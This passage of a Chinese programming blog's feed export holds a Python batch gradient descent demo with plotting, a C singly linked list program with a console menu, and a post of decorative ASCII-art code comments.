    <content><![CDATA[<h1 id="批量梯度下降"><a href="#批量梯度下降" class="headerlink" title="批量梯度下降"></a>批量梯度下降</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.animation <span class="keyword">import</span> FuncAnimation</span><br><span class="line"><span class="comment"># Excel预测函数</span></span><br><span class="line"><span class="comment"># y = 1771.8 + 28.777x</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据集</span></span><br><span class="line">x = [<span class="number">150</span>, <span class="number">200</span>, <span class="number">250</span>, <span class="number">300</span>, <span class="number">350</span>, <span class="number">400</span>, <span class="number">600</span>]</span><br><span class="line">y = [<span class="number">6450</span>, <span class="number">7450</span>, <span class="number">8450</span>, <span class="number">9450</span>, <span class="number">11450</span>, <span class="number">15450</span>, <span class="number">18450</span>]</span><br><span class="line"><span class="comment"># 迭代过程直线起始y值</span></span><br><span class="line">data = [[] <span class="keyword">for</span> i <span class="keyword">in</span> range(int(<span class="number">1E6</span>))]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 损失函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LossFunctionX</span>(<span class="params">theta0, theta1</span>):</span></span><br><span class="line">    los = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        h = (theta0 + theta1 * x[i])  <span class="comment"># 对theta0求偏导</span></span><br><span class="line">        los = los + (h - y[i])</span><br><span class="line">    <span class="keyword">return</span> los</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 损失函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LossFunctionY</span>(<span class="params">theta0, theta1</span>):</span></span><br><span class="line">    los = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(x)):</span><br><span class="line">        h = (theta0 + theta1 * x[i])  <span class="comment"># 对theta1求偏导</span></span><br><span class="line">        los = los + (h - y[i]) * x[i]</span><br><span class="line">    <span class="keyword">return</span> los</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># GIF更新函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">i</span>):</span></span><br><span class="line">    label = <span class="string">&#x27;timestep &#123;0&#125;&#x27;</span>.format(i)</span><br><span class="line">    <span class="comment"># print(label)</span></span><br><span class="line">    line.set_xdata([x[<span class="number">0</span>], x[len(x) - <span class="number">1</span>]])</span><br><span class="line">    line.set_ydata(data[i])  <span class="comment"># 重绘直线</span></span><br><span class="line">    ax.set_xlabel(label)  <span class="comment"># 重绘x轴标签</span></span><br><span class="line">    <span class="keyword">return</span> line, ax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 梯度下降</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GradientDescent</span>(<span class="params">theta0, theta1, iters, alphaX, alphaY</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(iters):</span><br><span class="line">        <span class="comment"># 迭代更新theta值</span></span><br><span class="line">        theta0 = theta0 - alphaX * LossFunctionX(theta0, theta1) / len(x)</span><br><span class="line">        theta1 = theta1 - alphaY * LossFunctionY(theta0, theta1) / len(x)</span><br><span class="line">        <span class="comment"># print(theta0, theta1)  # 输出迭代过程中theta值</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 画出迭代过程中拟合线性方程</span></span><br><span class="line">        plt.plot(x, y, <span class="string">&#x27;bo&#x27;</span>)</span><br><span class="line">        plt.plot([x[<span class="number">0</span>], x[len(x) - <span class="number">1</span>]], [theta0 + theta1 * x[<span class="number">0</span>], theta0 + theta1 * x[len(x) - <span class="number">1</span>]], <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 记录data值</span></span><br><span class="line">        data[i].append(theta0 + theta1 * x[<span class="number">0</span>])</span><br><span class="line">        data[i].append(theta0 + theta1 * x[len(x) - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> theta0, theta1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 参数分别为(theta0初始值, theta1初始值, 迭代次数, theta0学习速率, theta1学习速率)</span></span><br><span class="line">    a, b = GradientDescent(<span class="number">0</span>, <span class="number">0</span>, int(<span class="number">4E3</span>), <span class="number">1E-1</span>, <span class="number">1E-5</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制图形部分</span></span><br><span class="line">    plt.plot(x, y, <span class="string">&#x27;bo&#x27;</span>)  <span class="comment"># 画出散点图</span></span><br><span class="line">    plt.plot([x[<span class="number">0</span>], x[len(x) - <span class="number">1</span>]], [a + b * x[<span class="number">0</span>], a + b * x[len(x) - <span class="number">1</span>]], <span class="string">&#x27;r&#x27;</span>)  <span class="comment"># 画出拟合出的线性方程</span></span><br><span class="line">    plt.show()  <span class="comment"># 显示图形</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 绘制GIF部分</span></span><br><span class="line">    fig, ax = plt.subplots()</span><br><span class="line">    fig.set_tight_layout(<span class="literal">True</span>)</span><br><span class="line">    ax.scatter(x, y)  <span class="comment"># 绘制散点图, 不刷新</span></span><br><span class="line">    line, = ax.plot([x[<span class="number">0</span>], <span class="number">0</span>], [x[len(x) - <span class="number">1</span>], <span class="number">0</span>], <span class="string">&#x27;b&#x27;</span>)  <span class="comment"># 绘制初始直线, update函数对其进行更新</span></span><br><span class="line">    anim = FuncAnimation(fig, update, frames=<span class="number">10</span>, interval=<span class="number">1000</span>)  <span class="comment"># frames为帧数, interval为每帧停留的的时间ms</span></span><br><span class="line">    anim.save(<span class="string">&#x27;line.gif&#x27;</span>, dpi=<span class="number">100</span>, writer=<span class="string">&#x27;pillow&#x27;</span>)  <span class="comment"># dpi为分辨率</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出部分</span></span><br><span class="line">    print(<span class="string">&quot;theta0: &#123;0&#125;&quot;</span>.format(a))</span><br><span class="line">    print(<span class="string">&quot;theta1: &#123;0&#125;&quot;</span>.format(b))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<a id="more"></a>
<p>以下为输出结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theta0: 1771.8085106382905</span><br><span class="line">theta1: 28.776595744680872</span><br></pre></td></tr></table></figure><br>学习速率影响拟合速度，学习速率过大会导致无法到达最佳值点，反之，速率过小，拟合速度又会太慢。</p>
<div>
<img data-src="https://cdn.file.todest.cn/blog/pic/20200408.png" width="50%" height="50%" style="float:left"><img data-src="https://cdn.file.todest.cn/blog/pic/20200408.gif" width="50%" height="50%" style="float:left">
</div>

]]></content>
      <categories>
        <category>机器学习</category>
        <category>梯度下降</category>
      </categories>
      <tags>
        <tag>ML</tag>
      </tags>
  </entry>
  <entry>
    <title>链表</title>
    <url>/post/2362a8ea/</url>
    <content><![CDATA[<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><blockquote><p>链表是一种物理存储单元上非连续、非顺序的存储结构，数据元素的逻辑顺序是通过链表中的指针链接次序实现的。链表由一系列结点（链表中每一个元素称为结点）组成，结点可以在运行时动态生成。每个结点包括两个部分：一个是存储数据元素的数据域，另一个是存储下一个结点地址的指针域。 相比于线性表顺序结构，操作复杂。由于不必须按顺序存储，链表在插入的时候可以达到O(1)的复杂度，比另一种线性表顺序表快得多，但是查找一个节点或者访问特定编号的节点则需要O(n)的时间，而线性表和顺序表相应的时间复杂度分别是O(logn)和O(1)。</p>
<p>使用链表结构可以克服数组链表需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大。链表最明显的好处就是，常规数组排列关联项目的方式可能不同于这些数据项目在记忆体或磁盘上顺序，数据的存取往往要在不同的排列顺序中转换。链表允许插入和移除表上任意位置上的节点，但是不允许随机存取。链表有很多种不同的类型：单向链表，双向链表以及循环链表。链表可以在多种编程语言中实现。像Lisp和Scheme这样的语言的内建数据类型中就包含了链表的存取和操作。程序语言或面向对象语言，如C,C++和Java依靠易变工具来生成链表。</p>
<footer><strong>百度百科</strong><cite><a href="https://baike.baidu.com/item/%E9%93%BE%E8%A1%A8/9794473?fr=aladdin">链表</a></cite></footer></blockquote>
<a id="more"></a>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> ElemType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">    ElemType data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;Node,*LinkedList;</span><br><span class="line"><span class="function">LinkedList <span class="title">LinkedListInit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node *L;</span><br><span class="line">    L = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;申请内存空间失败\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"> 	<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LinkedList <span class="title">LinkedListCreatH_pre</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node *L,*t;</span><br><span class="line">    t = L = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    ElemType x;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x) != EOF) &#123;</span><br><span class="line">        Node *p;</span><br><span class="line">        p = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;data = x;</span><br><span class="line">        t-&gt;next = p;</span><br><span class="line">        p-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">        t = t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LinkedList <span class="title">LinkedListCreatH_back</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Node *L;</span><br><span class="line">    L = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ElemType x;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x) != EOF) &#123;</span><br><span class="line">        Node *p;</span><br><span class="line">        p = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        p-&gt;data = x;</span><br><span class="line">        p-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LinkedList <span class="title">LinkedListInsert</span><span class="params">(LinkedList L,<span class="keyword">int</span> i,ElemType x)</span> </span>&#123;</span><br><span class="line">    Node *pre=L;</span><br><span class="line">    <span class="keyword">int</span> tempi = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (tempi = <span class="number">1</span>; tempi &lt; i; tempi++) &#123;</span><br><span class="line">    	pre = pre-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">    Node *p;</span><br><span class="line">    p = (Node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    p-&gt;data = x;</span><br><span class="line">    p-&gt;next = pre-&gt;next;</span><br><span class="line">    pre-&gt;next = p;</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LinkedList <span class="title">LinkedListFind</span><span class="params">(LinkedList L,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">1</span>;</span><br><span class="line">    Node *p=L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;data != x) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有此数！\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> L;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d位于第%d个位置！\n&quot;</span>,x,i);</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LinkedList <span class="title">LinkedListDelete</span><span class="params">(LinkedList L,ElemType x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node *p,*pre=L;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;data != x) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;没有此数！\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> L;</span><br><span class="line">        &#125;</span><br><span class="line">        pre = p;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    pre-&gt;next = p-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1.输入(前插)\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;2.输入(后插)\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;3.插入数据\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;4.查找数据\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;5.删除数据\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0.退出程序\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LinkedList <span class="built_in">list</span>,start;</span><br><span class="line">    <span class="keyword">int</span> choice;</span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    	system(<span class="string">&quot;CLS&quot;</span>);</span><br><span class="line">    	menu();</span><br><span class="line">    	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;choice);</span><br><span class="line">    	<span class="keyword">switch</span>(choice)</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">    		&#123;</span><br><span class="line">    			<span class="built_in">printf</span>(<span class="string">&quot;请输入单链表的数据：&quot;</span>);</span><br><span class="line">			    <span class="built_in">list</span> = LinkedListCreatH_pre();</span><br><span class="line">			    <span class="keyword">for</span>(start = <span class="built_in">list</span>-&gt;next; start != <span class="literal">NULL</span>; start = start-&gt;next) &#123;</span><br><span class="line">			    	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class="line">				&#125;</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">    		&#123;</span><br><span class="line">    			<span class="built_in">printf</span>(<span class="string">&quot;请输入单链表的数据：&quot;</span>);</span><br><span class="line">			    <span class="built_in">list</span> = LinkedListCreatH_back();</span><br><span class="line">			    <span class="keyword">for</span>(start = <span class="built_in">list</span>-&gt;next; start != <span class="literal">NULL</span>; start = start-&gt;next) &#123;</span><br><span class="line">			    	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class="line">				&#125;</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">    		&#123;</span><br><span class="line">    			<span class="keyword">int</span> i;</span><br><span class="line">			    ElemType x;</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;请输入插入数据的位置：&quot;</span>);</span><br><span class="line">			    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;请输入插入数据的值：&quot;</span>);</span><br><span class="line">			    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">			    LinkedListInsert(<span class="built_in">list</span>,i,x);</span><br><span class="line">			    <span class="keyword">for</span>(start = <span class="built_in">list</span>-&gt;next; start != <span class="literal">NULL</span>; start = start-&gt;next) &#123;</span><br><span class="line">			    	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class="line">				&#125;</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    		&#123;</span><br><span class="line">    			ElemType x;</span><br><span class="line">    			<span class="built_in">printf</span>(<span class="string">&quot;请输入要查找的元素的值：&quot;</span>);</span><br><span class="line">			    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">			    LinkedListFind(<span class="built_in">list</span>,x);</span><br><span class="line">			    <span class="keyword">for</span>(start = <span class="built_in">list</span>-&gt;next; start != <span class="literal">NULL</span>; start = start-&gt;next) &#123;</span><br><span class="line">			    	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class="line">				&#125;</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">    		&#123;</span><br><span class="line">    			ElemType x;</span><br><span class="line">    			<span class="built_in">printf</span>(<span class="string">&quot;请输入要删除的元素的值：&quot;</span>);</span><br><span class="line">			    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">			    LinkedListDelete(<span class="built_in">list</span>,x);</span><br><span class="line">			    <span class="keyword">for</span>(start = <span class="built_in">list</span>-&gt;next; start != <span class="literal">NULL</span>; start = start-&gt;next) &#123;</span><br><span class="line">			    	<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>,start-&gt;data);</span><br><span class="line">				&#125;</span><br><span class="line">			    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">    		&#125;</span><br><span class="line">    		<span class="keyword">case</span> <span class="number">0</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    	&#125;</span><br><span class="line">    	system(<span class="string">&quot;PAUSE&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>链表</tag>
      </tags>
  </entry>
  <entry>
    <title>那些有趣的注释</title>
    <url>/post/2626d8b6/</url>
    <content><![CDATA[<blockquote>
<p><strong>标准键盘</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * ┌───┐   ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┬───┐ ┌───┬───┬───┐</span><br><span class="line"> * │Esc│   │ F1│ F2│ F3│ F4│ │ F5│ F6│ F7│ F8│ │ F9│F10│F11│F12│ │P&#x2F;S│S L│P&#x2F;B│  ┌┐    ┌┐    ┌┐</span><br><span class="line"> * └───┘   └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┴───┘ └───┴───┴───┘  └┘    └┘    └┘</span><br><span class="line"> * ┌───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───┬───────┐ ┌───┬───┬───┐ ┌───┬───┬───┬───┐</span><br><span class="line"> * │~ &#96;│! 1│@ 2│# 3│$ 4│% 5│^ 6│&amp; 7│* 8│( 9│) 0│_ -│+ &#x3D;│ BacSp │ │Ins│Hom│PUp│ │N L│ &#x2F; │ * │ - │</span><br><span class="line"> * ├───┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─────┤ ├───┼───┼───┤ ├───┼───┼───┼───┤</span><br><span class="line"> * │ Tab │ Q │ W │ E │ R │ T │ Y │ U │ I │ O │ P │&#123; [│&#125; ]│ | \ │ │Del│End│PDn│ │ 7 │ 8 │ 9 │   │</span><br><span class="line"> * ├─────┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴┬──┴─────┤ └───┴───┴───┘ ├───┼───┼───┤ + │</span><br><span class="line"> * │ Caps │ A │ S │ D │ F │ G │ H │ J │ K │ L │: ;│&quot; &#39;│ Enter  │               │ 4 │ 5 │ 6 │   │</span><br><span class="line"> * ├──────┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴─┬─┴────────┤     ┌───┐     ├───┼───┼───┼───┤</span><br><span class="line"> * │ Shift  │ Z │ X │ C │ V │ B │ N │ M │&lt; ,│&gt; .│? &#x2F;│  Shift   │     │ ↑ │     │ 1 │ 2 │ 3 │   │</span><br><span class="line"> * ├─────┬──┴─┬─┴──┬┴───┴───┴───┴───┴───┴──┬┴───┼───┴┬────┬────┤ ┌───┼───┼───┐ ├───┴───┼───┤ E││</span><br><span class="line"> * │ Ctrl│    │Alt │         Space         │ Alt│    │    │Ctrl│ │ ← │ ↓ │ → │ │   0   │ . │←─┘│</span><br><span class="line"> * └─────┴────┴────┴───────────────────────┴────┴────┴────┴────┘ └───┴───┴───┘ └───────┴───┴───┘</span><br><span class="line"> *&#x2F;</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<blockquote>
<p><strong>PC</strong></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">|                                                                        |</span><br><span class="line">|  +------------------------------------------------------------------+  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  |                                                                  |  |</span><br><span class="line">|  +------------------------------------------------------------------+  |</span><br><span class="line">|        f0    f1    f2    f3    f4    f5    f6    f7    f8    f9        |</span><br><span class="line">+------------------------------------------------------------------------+</span><br><span class="line">|                                                                        |</span><br><span class="line">|  [f0]  [f1]  [f2]  [f3]  [f4]  [f5]  [f6]  [f7]  [f8]  [f9]   [On&#x2F;Off] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [&lt;] [^] [v] [^] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|     [Q]  [W]  [E]  [R]  [T]  [Y]  [U]  [I]  [O]  [P]   [7] [8] [9] [&#x2F;] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|       [A]  [S]  [D]  [F]  [G]  [H]  [J]  [K]  [L]      [4] [5] [6] [*] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|  [CTRL]  [Z]  [X]  [C]  [V]  [B]  [N]  [M]  [ ENTER ]  [1] [2] [3] [-] |</span><br><span class="line">|                                                                        |</span><br><span class="line">|  [SHIFT]  [ALT]   [    space    ]   [,]  [.]  [SHIFT]  [0] [.] [&#x3D;] [+] |</span><br><span class="line">|                                                                        |</span><br><span class="line">+------------------------------------------------------------------------+</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**佛祖保佑，永无BUG</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;                            _ooOoo_    </span><br><span class="line">&#x2F;&#x2F;                           o8888888o    </span><br><span class="line">&#x2F;&#x2F;                           88&quot; . &quot;88    </span><br><span class="line">&#x2F;&#x2F;                           (| -_- |)    </span><br><span class="line">&#x2F;&#x2F;                            O\ &#x3D; &#x2F;O    </span><br><span class="line">&#x2F;&#x2F;                        ____&#x2F;&#96;---&#39;\____    </span><br><span class="line">&#x2F;&#x2F;                      .   &#39; \\| |&#x2F;&#x2F; &#96;.    </span><br><span class="line">&#x2F;&#x2F;                       &#x2F; \\||| : |||&#x2F;&#x2F; \    </span><br><span class="line">&#x2F;&#x2F;                     &#x2F; _||||| -:- |||||- \    </span><br><span class="line">&#x2F;&#x2F;                       | | \\\ - &#x2F;&#x2F;&#x2F; | |    </span><br><span class="line">&#x2F;&#x2F;                     | \_| &#39;&#39;\---&#x2F;&#39;&#39; | |    </span><br><span class="line">&#x2F;&#x2F;                      \ .-\__ &#96;-&#96; ___&#x2F;-. &#x2F;    </span><br><span class="line">&#x2F;&#x2F;                   ___&#96;. .&#39; &#x2F;--.--\ &#96;. . __    </span><br><span class="line">&#x2F;&#x2F;                .&quot;&quot; &#39;&lt; &#96;.___\_&lt;|&gt;_&#x2F;___.&#39; &gt;&#39;&quot;&quot;.    </span><br><span class="line">&#x2F;&#x2F;               | | : &#96;- \&#96;.;&#96;\ _ &#x2F;&#96;;.&#96;&#x2F; - &#96; : | |    </span><br><span class="line">&#x2F;&#x2F;                 \ \ &#96;-. \_ __\ &#x2F;__ _&#x2F; .-&#96; &#x2F; &#x2F;    </span><br><span class="line">&#x2F;&#x2F;         &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#96;-.____&#96;-.___\_____&#x2F;___.-&#96;____.-&#39;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;    </span><br><span class="line">&#x2F;&#x2F;                            &#96;&#x3D;---&#x3D;&#39;    </span><br><span class="line">&#x2F;&#x2F;    </span><br><span class="line">&#x2F;&#x2F;         .............................................    </span><br><span class="line">&#x2F;&#x2F;                  佛祖保佑             永无BUG</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**神兽护体，永无BUG</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; ┏┓　　　┏┓</span><br><span class="line">&#x2F;&#x2F; ┏┛┻━━━┛┻┓</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┃ 　</span><br><span class="line">&#x2F;&#x2F; ┃　　　━　　　┃</span><br><span class="line">&#x2F;&#x2F; ┃　┳┛　┗┳　┃</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class="line">&#x2F;&#x2F; ┃　　　┻　　　┃</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┃</span><br><span class="line">&#x2F;&#x2F; ┗━┓　　　┏━┛</span><br><span class="line">&#x2F;&#x2F; ┃　　　┃ Code is far away from bug with the animal protecting　　　　　　　　</span><br><span class="line">&#x2F;&#x2F; ┃　　　┃ 神兽保护，永无BUG！</span><br><span class="line">&#x2F;&#x2F; ┃　　　┗━━━┓</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┣┓</span><br><span class="line">&#x2F;&#x2F; ┃　　　　　　　┏┛</span><br><span class="line">&#x2F;&#x2F; ┗┓┓┏━┳┓┏┛</span><br><span class="line">&#x2F;&#x2F; ┃┫┫　┃┫┫</span><br><span class="line">&#x2F;&#x2F; ┗┻┛　┗┻┛</span><br></pre></td></tr></table></figure>
